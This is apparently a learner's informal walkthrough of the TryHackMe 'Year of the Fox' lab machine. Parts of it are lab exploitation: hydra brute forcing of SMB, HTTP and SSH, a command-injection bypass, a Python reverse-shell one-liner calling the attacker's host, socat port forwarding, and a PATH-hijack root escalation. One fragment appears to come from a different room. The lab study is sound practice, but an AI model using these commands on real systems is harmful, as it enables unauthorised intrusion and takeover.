### Year of the Fox Room

[room link](https://tryhackme.com/room/yotf)

```bash
$ export ip=10.10.71.216
```


ok, this machine is classified as hard so, let us start with nmap and some enumerations.

```bash
$ sudo nmap -sS -p- $ip -T3 -vv > nmap/inital
```
1. -sS: use SYN packages to enumerate
2. -p-: all ports

i'm using a new text editor now, not sublime anymore...The name of the new is obsidian, is so beautiful dude omg. Don't worry about it, just aleatory notes while the nmap scan isn't done.

maybe this ip has a http server open so, while the nmap isn't done i'll try to find web pages that are opened.

![](attachments/Pasted%20image%2020231016051220.png)

uoh, ok...Isn't possible to connect without username and passwords but the page show to us that the web server is Apache and the version is 2.4.29.

no cookies, nothing in view source too...

i can search in msfconsole for exploits to 2.4.29 if i'm lost but i won't do it now.

nmap scan is finally done,let's take a look...

```bash
PORT    STATE SERVICE      REASON
80/tcp  open  http         syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63
```

it's all what he got...

1. the http server with login
2. smb with netbios
3. smb connection

so,let's try enum4linux to enumarate this smb server

```bash
$ locate enum4linux
$ python3 /home/akame/tools/enum4linux-ng/enum4linux-ng.py $ip -vv
```

```bash
 ===========================================================
|    Domain Information via SMB session for 10.10.71.216    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: YEAR-OF-THE-FOX
NetBIOS domain name: ''
DNS domain: lan
FQDN: year-of-the-fox.lan
Derived membership: workgroup member
Derived domain: unknown
=====================================
|    Users via RPC on 10.10.71.216    |
 =====================================
[*] Enumerating users via 'querydispinfo'
[V] Attempting to get userlist, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpejcle01b -c querydispinfo 10.10.71.216
[+] Found 1 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[V] Attempting to get userlist, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpejcle01b -c enumdomusers 10.10.71.216
[+] Found 1 user(s) via 'enumdomusers'
[+] After merging user results we have 1 user(s) total:
'1000':
  username: fox
  name: fox
  acb: '0x00000010'
  description: ''
======================================
|    Shares via RPC on 10.10.71.216    |
 ======================================
[V] Attempting to get share list using authentication, running command: smbclient -W YEAROFTHEFOX -U % -s /tmp/tmpejcle01b -t 5 -L //10.10.71.216 -g
[*] Enumerating shares
[+] Found 2 share(s):
IPC$:
  comment: IPC Service (year-of-the-fox server (Samba, Ubuntu))
  type: IPC
yotf:
  comment: Fox's Stuff -- keep out!
  type: Disk  
```

interesting things here.....username "fox" and share "yotf"

```bash 
$ smbclient ////10.10.71.216//ipc$ -N 
```
1. -N: no pass
is possible connect but it have nothing inside, i'm not able to put anything into and the share "yotf" needs credentials....

i'm gonna try gobuster but if i got nothing maybe brute forcing is a good ideia...

```bash
$ gobuster -u http://10.10.71.216/ -w /usr/share/wordlists/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,js,php,md
```
1. -x: gobuster will find for extensions too.

my vm is so slow with brute forcing so,it will take a long time...

after a thirty minutes( just 6,8% of the directory list ), gobuster don't found nothing so...i'll try hydra in smb and web page with user "fox".

please god help me now

```bash
$ hydra -l fox -P /usr/share/wordlists/wordlists/rockyou.txt smb://10.10.71.216 -V  -F
```
1. -V: verbose mode
2. -F: stop when he found the password

if nothing work i can try this cve: [link to linkedin post](https://www.linkedin.com/pulse/poc-apache-version-2429-exploit-using-weakness-tmp-chanaka/)

BURP I FORGOT TO USE BURP OMG 

![](attachments/Pasted%20image%2020231016071706.png)

and didn't have nothing....but i'll use this to brute forcing the http-post

after so many time, i decided to scan one more and try brute forcing with more users because fox user didn't give anything to me.

```bash
$ python3 /home/akame/tools/enum4linux-ng/enum4linux-ng.py 10.10.71.216 -A -v -R 2000
```
1. -A: do all simple enumeration, this flag is enabled by default but i included her anyway
2. -v: verbose mode
3. -R 2000: THIS MAKE THE DIFFERENCE! this flag is used to enumerate users via RID cycling

RID cycling is basically a method to brute forcing domain,users or groups guessing RID and SID based on fact that SID are sequential 

SID means security identifier, looks like a id but is more than it. 

i create a script to enumerate it with rpcclient but i enum4linux can do it for you, anyway i'll put this script in this repository 

this was what the enum4linux found

```bash
 ==================================================================
|    Users, Groups and Machines on 10.10.71.216 via RID Cycling    |
 ==================================================================
[*] Trying to enumerate SIDs
[V] Attempting to get SID for user administrator, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'lookupnames administrator' 10.10.71.216
[V] Attempting to get SID for user guest, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'lookupnames guest' 10.10.71.216
[V] Attempting to get SID for user krbtgt, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'lookupnames krbtgt' 10.10.71.216
[V] Attempting to get SID for user domain admins, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'lookupnames domain admins' 10.10.71.216
[V] Attempting to get SID for user root, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'lookupnames root' 10.10.71.216
[V] Attempting to get SID for user bin, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'lookupnames bin' 10.10.71.216
[V] Attempting to get SID for user none, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'lookupnames none' 10.10.71.216
[V] Attempting to get SIDs via 'lsaenumsid', running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c lsaenumsid 10.10.71.216
[+] Found 3 SID(s)
[*] Trying SID S-1-22-1
[V] RID Cycling, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'lookupsids S-1-22-1-500 S-1-22-1-501 S-1-22-1-502 S-1-22-1-503 S-1-22-1-504 S-1-22-1-505 S-1-22-1-506 S-1-22-1-507 S-1-22-1-508 S-1-22-1-509 S-1-22-1-510 S-1-22-1-511 S-1-22-1-512 S-1-22-1-513 S-1-22-1-514 S-1-22-1-515 S-1-22-1-516 S-1-22-1-517 S-1-22-1-518 S-1-22-1-519 S-1-22-1-520 S-1-22-1-521 S-1-22-1-522 S-1-22-1-523 S-1-22-1-524 S-1-22-1-525 S-1-22-1-526 S-1-22-1-527 S-1-22-1-528 S-1-22-1-529 S-1-22-1-530 S-1-22-1-531 S-1-22-1-532 S-1-22-1-533 S-1-22-1-534 S-1-22-1-535 S-1-22-1-536 S-1-22-1-537 S-1-22-1-538 S-1-22-1-539 S-1-22-1-540 S-1-22-1-541 S-1-22-1-542 S-1-22-1-543 S-1-22-1-544 S-1-22-1-545 S-1-22-1-546 S-1-22-1-547 S-1-22-1-548 S-1-22-1-549 S-1-22-1-550' 10.10.71.216
[V] RID Cycling, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'lookupsids S-1-22-1-1000 S-1-22-1-1001 S-1-22-1-1002 S-1-22-1-1003 S-1-22-1-1004 S-1-22-1-1005 S-1-22-1-1006 S-1-22-1-1007 S-1-22-1-1008 S-1-22-1-1009 S-1-22-1-1010 S-1-22-1-1011 S-1-22-1-1012 S-1-22-1-1013 S-1-22-1-1014 S-1-22-1-1015 S-1-22-1-1016 S-1-22-1-1017 S-1-22-1-1018 S-1-22-1-1019 S-1-22-1-1020 S-1-22-1-1021 S-1-22-1-1022 S-1-22-1-1023 S-1-22-1-1024 S-1-22-1-1025 S-1-22-1-1026 S-1-22-1-1027 S-1-22-1-1028 S-1-22-1-1029 S-1-22-1-1030 S-1-22-1-1031 S-1-22-1-1032 S-1-22-1-1033 S-1-22-1-1034 S-1-22-1-1035 S-1-22-1-1036 S-1-22-1-1037 S-1-22-1-1038 S-1-22-1-1039 S-1-22-1-1040 S-1-22-1-1041 S-1-22-1-1042 S-1-22-1-1043 S-1-22-1-1044 S-1-22-1-1045 S-1-22-1-1046 S-1-22-1-1047 S-1-22-1-1048 S-1-22-1-1049 S-1-22-1-1050' 10.10.71.216
[+] Found user 'Unix User\rascal' (RID 1001)
[V] Attempting to get detailed user info, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'queryuser 1001' 10.10.71.216
[-] Could not find details for user 'Unix User\rascal': STATUS_NO_SUCH_USER
[*] Trying SID S-1-5-21-978893743-2663913856-222388731
[V] RID Cycling, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'lookupsids S-1-5-21-978893743-2663913856-222388731-500 S-1-5-21-978893743-2663913856-222388731-501 S-1-5-21-978893743-2663913856-222388731-502 S-1-5-21-978893743-2663913856-222388731-503 S-1-5-21-978893743-2663913856-222388731-504 S-1-5-21-978893743-2663913856-222388731-505 S-1-5-21-978893743-2663913856-222388731-506 S-1-5-21-978893743-2663913856-222388731-507 S-1-5-21-978893743-2663913856-222388731-508 S-1-5-21-978893743-2663913856-222388731-509 S-1-5-21-978893743-2663913856-222388731-510 S-1-5-21-978893743-2663913856-222388731-511 S-1-5-21-978893743-2663913856-222388731-512 S-1-5-21-978893743-2663913856-222388731-513 S-1-5-21-978893743-2663913856-222388731-514 S-1-5-21-978893743-2663913856-222388731-515 S-1-5-21-978893743-2663913856-222388731-516 S-1-5-21-978893743-2663913856-222388731-517 S-1-5-21-978893743-2663913856-222388731-518 S-1-5-21-978893743-2663913856-222388731-519 S-1-5-21-978893743-2663913856-222388731-520 S-1-5-21-978893743-2663913856-222388731-521 S-1-5-21-978893743-2663913856-222388731-522 S-1-5-21-978893743-2663913856-222388731-523 S-1-5-21-978893743-2663913856-222388731-524 S-1-5-21-978893743-2663913856-222388731-525 S-1-5-21-978893743-2663913856-222388731-526 S-1-5-21-978893743-2663913856-222388731-527 S-1-5-21-978893743-2663913856-222388731-528 S-1-5-21-978893743-2663913856-222388731-529 S-1-5-21-978893743-2663913856-222388731-530 S-1-5-21-978893743-2663913856-222388731-531 S-1-5-21-978893743-2663913856-222388731-532 S-1-5-21-978893743-2663913856-222388731-533 S-1-5-21-978893743-2663913856-222388731-534 S-1-5-21-978893743-2663913856-222388731-535 S-1-5-21-978893743-2663913856-222388731-536 S-1-5-21-978893743-2663913856-222388731-537 S-1-5-21-978893743-2663913856-222388731-538 S-1-5-21-978893743-2663913856-222388731-539 S-1-5-21-978893743-2663913856-222388731-540 S-1-5-21-978893743-2663913856-222388731-541 S-1-5-21-978893743-2663913856-222388731-542 S-1-5-21-978893743-2663913856-222388731-543 S-1-5-21-978893743-2663913856-222388731-544 S-1-5-21-978893743-2663913856-222388731-545 S-1-5-21-978893743-2663913856-222388731-546 S-1-5-21-978893743-2663913856-222388731-547 S-1-5-21-978893743-2663913856-222388731-548 S-1-5-21-978893743-2663913856-222388731-549 S-1-5-21-978893743-2663913856-222388731-550' 10.10.71.216
[+] Found user 'YEAR-OF-THE-FOX\nobody' (RID 501)
[V] Attempting to get detailed user info, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'queryuser 501' 10.10.71.216
[+] Found details for user 'YEAR-OF-THE-FOX\nobody' (RID 501)
[+] Found domain group 'YEAR-OF-THE-FOX\None' (RID 513)
[V] Attempting to get detailed group info, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'querygroup 513' 10.10.71.216
[+] Found details for domain group 'YEAR-OF-THE-FOX\None' (RID 513)
[V] RID Cycling, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'lookupsids S-1-5-21-978893743-2663913856-222388731-1000 S-1-5-21-978893743-2663913856-222388731-1001 S-1-5-21-978893743-2663913856-222388731-1002 S-1-5-21-978893743-2663913856-222388731-1003 S-1-5-21-978893743-2663913856-222388731-1004 S-1-5-21-978893743-2663913856-222388731-1005 S-1-5-21-978893743-2663913856-222388731-1006 S-1-5-21-978893743-2663913856-222388731-1007 S-1-5-21-978893743-2663913856-222388731-1008 S-1-5-21-978893743-2663913856-222388731-1009 S-1-5-21-978893743-2663913856-222388731-1010 S-1-5-21-978893743-2663913856-222388731-1011 S-1-5-21-978893743-2663913856-222388731-1012 S-1-5-21-978893743-2663913856-222388731-1013 S-1-5-21-978893743-2663913856-222388731-1014 S-1-5-21-978893743-2663913856-222388731-1015 S-1-5-21-978893743-2663913856-222388731-1016 S-1-5-21-978893743-2663913856-222388731-1017 S-1-5-21-978893743-2663913856-222388731-1018 S-1-5-21-978893743-2663913856-222388731-1019 S-1-5-21-978893743-2663913856-222388731-1020 S-1-5-21-978893743-2663913856-222388731-1021 S-1-5-21-978893743-2663913856-222388731-1022 S-1-5-21-978893743-2663913856-222388731-1023 S-1-5-21-978893743-2663913856-222388731-1024 S-1-5-21-978893743-2663913856-222388731-1025 S-1-5-21-978893743-2663913856-222388731-1026 S-1-5-21-978893743-2663913856-222388731-1027 S-1-5-21-978893743-2663913856-222388731-1028 S-1-5-21-978893743-2663913856-222388731-1029 S-1-5-21-978893743-2663913856-222388731-1030 S-1-5-21-978893743-2663913856-222388731-1031 S-1-5-21-978893743-2663913856-222388731-1032 S-1-5-21-978893743-2663913856-222388731-1033 S-1-5-21-978893743-2663913856-222388731-1034 S-1-5-21-978893743-2663913856-222388731-1035 S-1-5-21-978893743-2663913856-222388731-1036 S-1-5-21-978893743-2663913856-222388731-1037 S-1-5-21-978893743-2663913856-222388731-1038 S-1-5-21-978893743-2663913856-222388731-1039 S-1-5-21-978893743-2663913856-222388731-1040 S-1-5-21-978893743-2663913856-222388731-1041 S-1-5-21-978893743-2663913856-222388731-1042 S-1-5-21-978893743-2663913856-222388731-1043 S-1-5-21-978893743-2663913856-222388731-1044 S-1-5-21-978893743-2663913856-222388731-1045 S-1-5-21-978893743-2663913856-222388731-1046 S-1-5-21-978893743-2663913856-222388731-1047 S-1-5-21-978893743-2663913856-222388731-1048 S-1-5-21-978893743-2663913856-222388731-1049 S-1-5-21-978893743-2663913856-222388731-1050' 10.10.71.216
[*] Trying SID S-1-5-32
[V] RID Cycling, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'lookupsids S-1-5-32-500 S-1-5-32-501 S-1-5-32-502 S-1-5-32-503 S-1-5-32-504 S-1-5-32-505 S-1-5-32-506 S-1-5-32-507 S-1-5-32-508 S-1-5-32-509 S-1-5-32-510 S-1-5-32-511 S-1-5-32-512 S-1-5-32-513 S-1-5-32-514 S-1-5-32-515 S-1-5-32-516 S-1-5-32-517 S-1-5-32-518 S-1-5-32-519 S-1-5-32-520 S-1-5-32-521 S-1-5-32-522 S-1-5-32-523 S-1-5-32-524 S-1-5-32-525 S-1-5-32-526 S-1-5-32-527 S-1-5-32-528 S-1-5-32-529 S-1-5-32-530 S-1-5-32-531 S-1-5-32-532 S-1-5-32-533 S-1-5-32-534 S-1-5-32-535 S-1-5-32-536 S-1-5-32-537 S-1-5-32-538 S-1-5-32-539 S-1-5-32-540 S-1-5-32-541 S-1-5-32-542 S-1-5-32-543 S-1-5-32-544 S-1-5-32-545 S-1-5-32-546 S-1-5-32-547 S-1-5-32-548 S-1-5-32-549 S-1-5-32-550' 10.10.71.216
[+] Found builtin group 'BUILTIN\Administrators' (RID 544)
[V] Attempting to get detailed group info, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'querygroup 544' 10.10.71.216
[-] Could not get details for builtin group 'BUILTIN\Administrators' (RID 544): STATUS_NO_SUCH_GROUP
[+] Found builtin group 'BUILTIN\Users' (RID 545)
[V] Attempting to get detailed group info, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'querygroup 545' 10.10.71.216
[-] Could not get details for builtin group 'BUILTIN\Users' (RID 545): STATUS_NO_SUCH_GROUP
[+] Found builtin group 'BUILTIN\Guests' (RID 546)
[V] Attempting to get detailed group info, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'querygroup 546' 10.10.71.216
[-] Could not get details for builtin group 'BUILTIN\Guests' (RID 546): STATUS_NO_SUCH_GROUP
[+] Found builtin group 'BUILTIN\Power Users' (RID 547)
[V] Attempting to get detailed group info, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'querygroup 547' 10.10.71.216
[-] Could not get details for builtin group 'BUILTIN\Power Users' (RID 547): STATUS_NO_SUCH_GROUP
[+] Found builtin group 'BUILTIN\Account Operators' (RID 548)
[V] Attempting to get detailed group info, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'querygroup 548' 10.10.71.216
[-] Could not get details for builtin group 'BUILTIN\Account Operators' (RID 548): STATUS_NO_SUCH_GROUP
[+] Found builtin group 'BUILTIN\Server Operators' (RID 549)
[V] Attempting to get detailed group info, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'querygroup 549' 10.10.71.216
[-] Could not get details for builtin group 'BUILTIN\Server Operators' (RID 549): STATUS_NO_SUCH_GROUP
[+] Found builtin group 'BUILTIN\Print Operators' (RID 550)
[V] Attempting to get detailed group info, running command: rpcclient -W YEAROFTHEFOX -U % -s /tmp/tmpqohys1sk -c 'querygroup 550' 10.10.71.216
```

important notes:

	[+] Found user 'Unix User/ rascal'
	[+] Found user 'YEAR-OF-THE-FOX/ nobody'
	[+] Found domain group 'YEAR-OF-THE-FOX / None'
	[+] Found builtin group 'BUILTIN/ Administrators'

then,now i have more information to try another things

	usernames: fox, rascal, nobody
	shares: $ipc, yotf
now i'll try brute forcing again and while it isn't done i'm gonna try access smb server with rascal user or nobody and see with i find something 

```bash
$ hydra -l rascal -P /usr/share/wordlists/wordlists/rockyou.txt 10.10.103.133 http-head / -V -F
```
question 1: why http-head in hydra command?

i was questioning myself about this, but maybe it's because the login that this site requests it's the standart, anyway the brute force works with http-post too. But in another login pages like isn't the standart login form browser you'll need to use http-post and specify the layers and a response which the site sends to you, i think so. 

if you can see my stars in github, there is a repository that probaly will explain it. The name was "hydra-notes" i think so

THANKS GOD. 

![](attachments/Pasted%20image%2020231016082740.png)

logging with rascal:

![](attachments/Pasted%20image%2020231016082813.png)

let's take a look at this web page...

didn't have anything in storage but i found two js files,probaly interlinked with this input "Looking for something?". But first let me see what this input do...He searchs for files, i can't type some chars like " * /  % , . ; . " he immediately exclues what i type. But i can type fast the char "/" and get a return:

![](attachments/Pasted%20image%2020231016083401.png)

but i can't read, maybe can i bypass this "security layer" and inject commands?

today is another day and i saw that the password changes every time the machine is turned off, so the password today is another but i already got it :)
maybe the password will be always in rockyou.txt list so i recommend that you use it 

"gitrdone"

now i'm gonna deobfuscate the js code to see what the web page is doing 

i'll leave the file in the directory if you want to read :)

ok,the first tip to deobfuscate whatever code is replace the var names and everything that you understand, trust me it helps a lot.

i dont know if i really need to do this but is cool deobfuscating code so... i'll do it anyway and to do this i'm gonna use subl because it's so better in this case. You can use(with the word selected) "Ctrl + D" to find all the times it appears in the code or you can use "Ctrl + Shift + F" to replace all. 

this is the regex that doesn't allow us to type whatever we want

"[ ^a-zA-Z0-9.  ] "

i don't know much about regex but it allows us to type all alfabeth, numbers and points.

dude wtf this code is so messy and confusing javascript is really a weird language.

...i'm regretting it lmao and i'm regretting more because i'm 100% sure that i didn't need to deobfuscate it....but it's ok i'm here to learn 

i really tried so much but this code is giving me headache and i gonna die if i try understand it better.

ok,new day again and i've made progress finally.

let's me explain what i did, i stopped at the those "Search!" input that didn't allows me to do what i wanted.

this input has a two security layer, i don't know the real name but i'll split it in two names

	client-side
	server-side


the "client-side" was the regex in javascript file that doesn't allow us to enter some specific characters like " / ; ~ \ " etc etc...But it was only javascript, i.e. this "security layer" exists only in my browser. To bypass it i used BurpSuite to intercept the request and i made other requests from there.

![](attachments/Pasted%20image%2020231018052107.png)

so, how can you see there, i could type whatever i wanted and i made a request to server BUT i hadn't an rce yet.

now what is come next is the "client-side", look.

![](attachments/Pasted%20image%2020231018052414.png)

even with the javascript verification to not allow us to type specifics characters, there is another verification that check my input in server.

so to bypass i just tried a million different inputs and after much time i saw one person saying that you can use `ping -c 4 $yourip` to see if your commands are being executed.

![](attachments/Pasted%20image%2020231018053815.png)

```bash
$ sudo tcpdump icmp -n
```
to listen all request sends to my machine.

so,now i know that my commands are being executed, i can make a reverse shell using bash or something like this!

i've tried so many shells with so many different forms and this works and i don't know why but now i'm into machine :)
```
"ls `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.0\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'`"
```

it didn't work without the slash between ip and "/bin/sh", ls and the grave. Don't ask me why i don't know 

```bash
$ /usr/bin/python3.6 -c 'import pty;pty.spawn("/bin/bash")'
```
to spawn a better shell :)

![](attachments/Pasted%20image%2020231018063418.png)

ok,i've got the web flag in www directory and now i need to escalate privileges to get root.

after a so much i've got...nothing! wtf nothing working to escalate privilege, i'll tell you what i did.

first i searched in www directory but i found nothing, su didn't work, i hadn't any passwords, no files in contrab, no binaries with suid or capabilities.

so i found the creds2.txt in "/var/www/html/files/" or in a somewhere like this.

```bash
$ cat creds2.txt
LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAXUTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=
```

so,in my mind i was "YEAH IS IT, WHEN I DECODE THIS, WILL BE AN PASSWORD" but no,i've tried so many different forms to decode this and nothing happens so i gave up....

and i decided run linpeas since that i didn't find literally nothing, then...

```bash
in my machine:
$ cd /home/akame/tools
$ python3 -m http.server 8000

in yotf machine:
$ cd /tmp/
$ wget http://$myip:8000/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
```

AND....lmao nothing again.

it's a joke, linpeas found some interesting things like a login that i didn't find from where it was and THIS.
![](attachments/Pasted%20image%2020231018092706.png)

often i ignore this because i'm dumb. But maybe i can get user fox or rascal with port forwarding thecnique!

i never did it, so it's a new thecnique that i'm gonna learn today! This blog i'll help me with this [infosec writeup port forwarding](https://infosecwriteups.com/gain-access-to-an-internal-machine-using-port-forwarding-penetration-testing-518c0b6a4a0e), and how are you gonna do this? dunno :D i need to read the blog first wait a minute and i'll explain here too.

i'm lying,i'm not gonna explain this here but i'll give to you a link to my notes in notion [here](https://vivacious-church-b42.notion.site/port-forwarding-da3f15d4da6c4d06b2488687267165c2?pvs=25) if you want to read or just read the blog. So when i wake up today i'm thinking about how i could get another using this thecnique if i don't have any passwords....Probaly a brute forcing again i think so

after a few hours i understand the port forwarding thecnique and i'm gonna use socat to do this local port forwarding.

so,the commands now:

```bash
in my machine:
$ sudo apt update && sudo apt install socat # help us to make the port forwarding but ssh can be used
$ cd /usr/bin
$ python3 -m http.server 8080

in yotf machine:
$ wget http://$myip:8080/socat
$ ./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22 &
```
ok,let me explain all of these. First i downloaded the socat and after this, i've opened a python http server in my binaries folder.

now, in thm machine through rev shell i took the socat binary and execute with this parameters.
1. tcp-listen:8888 - which port i'll use to do the tunnel 
2. reuseaddr -  This option indicates that the listening socket should be allowed to reuse the local address. It is often used when you want to restart the socat command without waiting for the OS to release the port.
3. fork - this is commonly used for handling multiple client connections simultaneously. 
4. tcp:localhost:22 - this part of the command specifies the destination of the forwarded traffic. It tells socat to forward the incoming connections to a TCP address. In this case, it's forwarding to localhost (127.0.0.1) on port 22, which is the default port for SSH.
5. & - is used to run this command in background, so i could stay using the terminal if i want

well, let's see if it works!

![](attachments/Pasted%20image%2020231019111634.png)

yeah, worked! So,now i can brute force the ssh.

i'm using the user fox and not rascal because i took a look at the ssh configuration at "/etc/ssh/sshd_config" and...
![](attachments/Pasted%20image%2020231019123907.png)
```bash
in my machine:
$ sudo nmap -sS $ip 
$ ssh -p8888 fox@$ip 
$ hydra -l fox -P /usr/share/wordlists/wordlists/rockyou.txt ssh://$ip:8888 -V -F

```

![](attachments/Pasted%20image%2020231019111541.png)
so,now i'm going to escalate to root, let's see what we have.
![](attachments/Pasted%20image%2020231020050215.png)
ok, good things here, maybe i can overwrite using PATH or something like this?

$ mkdir /tmp/foo # create random directory to put the script

$ echo "/bin/sh" > /tmp/foo/date # create the script that will launch /bin/sh

$ chmod 777 /tmp/foo/date # mark it as executable

$ PATH=/tmp/foo:$PATH 

$ /home/rabbit/teaParty

$ whoami 
hatter

explanation from this blog [here](https://blog.creekorful.org/2020/09/setuid-privilege-escalation/)
	
	    How does the PATH work exactly?
	    
	    The PATH variable is used to lookup executables when issuing command. It is composed of directories to include while searching, separated by a semicolon ‘:'.
	    
	    For example: /usr/local/bin:/usr/bin:/bin means that executables will be searched in the following directories:
	    
	        /usr/local/bin
	        /usr/bin
	        /bin
	    
	    The search will stop when the executable is found. It means that if apt is present in /usr/local/bin/apt it will not be searched in the others    directories

and this what i'll do is overwrite the path and create a file that contains "/bin/bash" inside called by poweroff(probaly is an command or something like this used in shutdown)

i'm gonna take a look at hidra to see if is really it
![](attachments/Pasted%20image%2020231020052653.png)
yeah, so now it's explained ;)

```bash 
$ cd /tmp
$ echo "/bin/bash" > poweroff
$ chmod +x poweroff
$ export PATH=/tmp:$PATH
$ sudo /usr/sbin/shutdown
# whoami
```

![](attachments/Pasted%20image%2020231020051016.png)

now is just go to root directory and....omg this is such a pain
![](attachments/Pasted%20image%2020231020051106.png)


maybe rascal is the user that contains this flag? i'm only logged with fox user so...
![](attachments/Pasted%20image%2020231020051437.png)

HHAHAAHA LMAO, i like it.

and this prize? i didn't get nothing, i decoded to base64 and it gives to me a hash but i couldn't break it :( 

but its ok, we finally finish this machine omg! It was so funny :D 
